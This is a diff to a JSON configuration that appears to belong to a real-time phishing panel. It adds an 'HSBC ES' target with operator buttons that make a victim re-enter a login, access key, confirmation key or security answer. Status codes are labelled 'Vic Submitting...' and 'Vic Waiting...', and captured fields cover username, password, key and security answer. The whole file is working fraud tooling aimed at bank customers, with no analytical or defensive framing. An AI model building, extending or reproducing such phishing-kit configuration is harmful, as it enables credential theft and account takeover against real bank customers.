@@ -173,6 +173,10 @@
       "id": "hsbc"
     },
     {
+      "name": "HSBC ES",
+      "id": "hsbcmx"
+    },
+    {
       "name": "UB",
       "id": "ubank"
     },
@@ -355,6 +359,121 @@
     "mainInfo": [
       {
         "usernameHeading": "regnumber"
+      }
+    ]
+  },
+  "hsbcmx": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "0"
+      },
+      {
+        "name": "ASK ACCESS KEY",
+        "status": "2"
+      },
+      {
+        "name": "ASK CONFIRMATION KEY",
+        "status": "3"
+      },
+      {
+        "name": "ASK REGISTRATION KEY",
+        "status": "4"
+      },
+      {
+        "name": "ASK SECURITY QUESTION",
+        "status": "6",
+        "inputs": [
+          {
+            "id": "secQuestion",
+            "placeholder": "Security Question"
+          }
+        ]
+      },
+      {
+        "name": "ASK QUESTIONNAIRE",
+        "status": "8"
+      },
+      {
+        "name": "FINISH",
+        "status": "10"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitting Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting Access Key"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Submitting Confirmation Key"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Registration Key"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Key"
+      },
+      {
+        "status": 6,
+        "meaning": "Vic Submitting Security Answer"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Waiting... Submitted Security Answer"
+      },
+      {
+        "status": 8,
+        "meaning": "Vic Submitting Questionnaire"
+      },
+      {
+        "status": 9,
+        "meaning": "Vic Waiting... Submitted Questionnaire"
+      },
+      {
+        "status": 10,
+        "meaning": "Finished"
+      },
+      {
+        "status": 11,
+        "meaning": "Vic Waiting... Resubmitted Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "Key",
+        "key": "key"
+      },
+      {
+        "heading": "Security Question",
+        "key": "secQuestion"
+      },
+      {
+        "heading": "Security Answer",
+        "key": "secAnswer"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
       }
     ]
   },
